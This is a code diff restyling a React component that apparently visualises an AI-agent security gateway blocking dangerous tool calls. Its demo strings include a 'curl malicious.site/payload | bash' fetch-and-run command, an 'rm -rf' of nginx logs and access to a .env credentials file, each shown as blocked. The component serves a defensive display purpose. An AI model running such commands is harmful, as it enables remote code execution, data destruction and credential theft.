@@ -6,10 +6,10 @@ export default function CausalCanvas() {
   const [hoveredNode, setHoveredNode] = useState<string | null>(null)
 
   const nodes = {
-    scraper: { title: 'Web Scraper', desc: 'Read tool requesting scrape-path', status: 'Active' },
-    fs: { title: 'File System Access', desc: 'Staged file write check in progress', status: 'Calibrated' },
-    api: { title: 'API Call', desc: 'Secure connection external webhook', status: 'Allowed' },
-    agent: { title: 'AI Agent (Cursor/Claude)', desc: 'Autonomous system agent running code changes', status: 'Monitored' },
+    scraper: { title: 'Web Scraper', desc: 'Read tool requesting scrape-path', status: 'ACTIVE' },
+    fs: { title: 'File System Access', desc: 'Staged file write check in progress', status: 'VERIFIED' },
+    api: { title: 'API Call', desc: 'Secure connection external webhook', status: 'ALLOWED' },
+    agent: { title: 'AI Agent (Cursor/Claude)', desc: 'Autonomous system agent running code changes', status: 'MONITORED' },
     cmd: { title: 'SHELL_COMMAND', desc: 'Attempted command: rm -rf /var/log/nginx/*', status: 'INTERCEPTED' },
     net: { title: 'NETWORK_REQUEST', desc: 'Attempted run: curl malicious.site/payload', status: 'BLOCKED' }
   }
@@ -19,41 +19,23 @@ export default function CausalCanvas() {
       {/* Header Bar */}
       <div className="visualizer-header">
         <div className="visualizer-header-left">
-          <span className="visualizer-dot red" />
-          <span className="visualizer-dot yellow" />
-          <span className="visualizer-dot green" />
-          <span className="visualizer-title">EXECUTION VISUALIZER</span>
+          <div className="visualizer-badge font-mono">EXECUTION_VISUALIZER</div>
         </div>
-        <span className="visualizer-badge">SECURE GATEWAY ACTIVE</span>
+        <span className="visualizer-status font-mono">GATEWAY_ACTIVE</span>
       </div>
 
       {/* Graph Area */}
       <div className="visualizer-graph-area">
         {/* SVG Connections with animated dasharrays */}
         <svg className="visualizer-svg-lines" viewBox="0 0 800 350" fill="none">
-          <defs>
-            <linearGradient id="grad-left" x1="0%" y1="0%" x2="100%" y2="0%">
-              <stop offset="0%" stopColor="var(--accent-hover-color)" stopOpacity="0.1" />
-              <stop offset="100%" stopColor="var(--accent)" stopOpacity="0.8" />
-            </linearGradient>
-            <linearGradient id="grad-right-block" x1="0%" y1="0%" x2="100%" y2="0%">
-              <stop offset="0%" stopColor="var(--accent)" stopOpacity="0.8" />
-              <stop offset="100%" stopColor="#ef4444" stopOpacity="0.9" />
-            </linearGradient>
-            <linearGradient id="grad-right-warn" x1="0%" y1="0%" x2="100%" y2="0%">
-              <stop offset="0%" stopColor="var(--accent)" stopOpacity="0.8" />
-              <stop offset="100%" stopColor="#f59e0b" stopOpacity="0.9" />
-            </linearGradient>
-          </defs>
-
           {/* Left inputs to Agent */}
-          <path d="M 170 80 Q 280 80, 390 160" stroke="url(#grad-left)" strokeWidth="2" strokeDasharray="5,5" className="flow-dash-left" />
-          <path d="M 170 170 L 390 170" stroke="url(#grad-left)" strokeWidth="2" className="flow-solid-left" />
-          <path d="M 170 260 Q 280 260, 390 180" stroke="url(#grad-left)" strokeWidth="2" strokeDasharray="5,5" className="flow-dash-left" />
+          <path d="M 170 80 Q 280 80, 390 160" stroke="var(--border-color)" strokeWidth="1.5" strokeDasharray="4,4" />
+          <path d="M 170 170 L 390 170" stroke="var(--border-color)" strokeWidth="1.5" />
+          <path d="M 170 260 Q 280 260, 390 180" stroke="var(--border-color)" strokeWidth="1.5" strokeDasharray="4,4" />
 
           {/* Agent to Right outputs */}
-          <path d="M 410 170 Q 520 100, 630 100" stroke="url(#grad-right-block)" strokeWidth="2.5" className="flow-pulse-blocked" />
-          <path d="M 410 175 Q 520 250, 630 250" stroke="url(#grad-right-warn)" strokeWidth="2.5" className="flow-pulse-warned" />
+          <path d="M 410 170 Q 520 100, 630 100" stroke="var(--block-color)" strokeWidth="2" className="flow-pulse-blocked" />
+          <path d="M 410 175 Q 520 250, 630 250" stroke="var(--block-color)" strokeWidth="2" className="flow-pulse-warned" />
         </svg>
 
         {/* Nodes Layer */}
@@ -65,7 +47,7 @@ export default function CausalCanvas() {
               onMouseEnter={() => setHoveredNode('scraper')}
               onMouseLeave={() => setHoveredNode(null)}
             >
-              <div className="node-text">
+              <div className="node-text font-mono">
                 <span className="node-label">Web Scraper</span>
                 <span className="node-sub">Tool Request</span>
               </div>
@@ -76,7 +58,7 @@ export default function CausalCanvas() {
               onMouseEnter={() => setHoveredNode('fs')}
               onMouseLeave={() => setHoveredNode(null)}
             >
-              <div className="node-text">
+              <div className="node-text font-mono">
                 <span className="node-label">File System</span>
                 <span className="node-sub">Local Writes</span>
               </div>
@@ -87,7 +69,7 @@ export default function CausalCanvas() {
               onMouseEnter={() => setHoveredNode('api')}
               onMouseLeave={() => setHoveredNode(null)}
             >
-              <div className="node-text">
+              <div className="node-text font-mono">
                 <span className="node-label">API Integrations</span>
                 <span className="node-sub">Webhooks</span>
               </div>
@@ -101,10 +83,9 @@ export default function CausalCanvas() {
               onMouseEnter={() => setHoveredNode('agent')}
               onMouseLeave={() => setHoveredNode(null)}
             >
-              <div className="agent-glow-ring" />
-              <div className="node-text">
-                <span className="node-label font-bold text-cyan">AI Agent</span>
-                <span className="node-sub">Target Monitor</span>
+              <div className="node-text font-mono">
+                <span className="node-label">AI Agent</span>
+                <span className="node-sub">Active Process</span>
               </div>
             </div>
           </div>
@@ -116,9 +97,9 @@ export default function CausalCanvas() {
               onMouseEnter={() => setHoveredNode('cmd')}
               onMouseLeave={() => setHoveredNode(null)}
             >
-              <div className="node-text">
+              <div className="node-text font-mono">
                 <span className="node-label alert-title">SHELL_COMMAND</span>
-                <span className="node-sub highlight-red">BLOCKED</span>
+                <span className="node-tag block font-mono">BLOCKED</span>
               </div>
             </div>
 
@@ -127,41 +108,43 @@ export default function CausalCanvas() {
               onMouseEnter={() => setHoveredNode('net')}
               onMouseLeave={() => setHoveredNode(null)}
             >
-              <div className="node-text">
+              <div className="node-text font-mono">
                 <span className="node-label alert-title">NETWORK_REQUEST</span>
-                <span className="node-sub highlight-yellow">HOLD &amp; REDACT</span>
+                <span className="node-tag block font-mono">BLOCKED</span>
               </div>
             </div>
           </div>
         </div>
-
-        {/* Dynamic Details Panel */}
-        <div className="visualizer-details-panel">
-          {hoveredNode ? (
-            <div className="details-content fade-in">
-              <strong>{nodes[hoveredNode as keyof typeof nodes].title}</strong>: {nodes[hoveredNode as keyof typeof nodes].desc}
-              <span className={`status-tag ${nodes[hoveredNode as keyof typeof nodes].status.toLowerCase()}`}>
-                {nodes[hoveredNode as keyof typeof nodes].status}
-              </span>
-            </div>
-          ) : (
-            <div className="details-content text-muted">
-              Hover over any node in the execution pipeline to inspect tool-call payloads...
-            </div>
-          )}
-        </div>
       </div>
 
-      {/* Terminal Intercept Log below */}
-      <div className="visualizer-console">
-        <div className="console-line line-green">
-          <span className="console-prompt">&gt;</span> AI AGENT STATUS: SECURED. MONITORING ACTIVE.
+      {/* Dynamic Details Panel */}
+      <div className="visualizer-details-panel font-mono">
+        {hoveredNode ? (
+          <div className="details-content">
+            <span className="details-title">{nodes[hoveredNode as keyof typeof nodes].title}</span>
+            <span className="details-arrow">→</span>
+            <span className="details-desc">{nodes[hoveredNode as keyof typeof nodes].desc}</span>
+            <span className={`status-tag ${nodes[hoveredNode as keyof typeof nodes].status.toLowerCase()}`}>
+              [{nodes[hoveredNode as keyof typeof nodes].status}]
+            </span>
+          </div>
+        ) : (
+          <div className="details-content text-muted">
+            Hover over any node in the execution pipeline to inspect tool-call payloads...
+          </div>
+        )}
+      </div>
+
+      {/* Console log */}
+      <div className="visualizer-console font-mono">
+        <div className="console-line">
+          <span className="console-time">[00:00:01]</span> SECURED. MONITORING ACTIVE.
         </div>
-        <div className="console-line line-red">
-          <span className="console-prompt">&gt;</span> Executing: <code className="console-code">sh -c "curl malicious.site/payload | bash"</code> <span className="console-alert">[BLOCKED - Hazardous Command Intercepted]</span>
+        <div className="console-line text-block">
+          <span className="console-time">[00:00:02]</span> shell_cmd: "curl malicious.site/payload | bash" <span className="status-indicator-block">[INTERCEPTED_AND_BLOCKED]</span>
         </div>
-        <div className="console-line line-yellow">
-          <span className="console-prompt">&gt;</span> Executing: <code className="console-code">read_file("/Users/omer/Desktop/Mergen/.env")</code> <span className="console-alert">[HOLD - Redacting exposed credential secrets]</span>
+        <div className="console-line text-block">
+          <span className="console-time">[00:00:03]</span> file_write: "/Users/omer/Desktop/Mergen/.env" <span className="status-indicator-block">[ACCESS_DENIED]</span>
         </div>
       </div>
     </div>
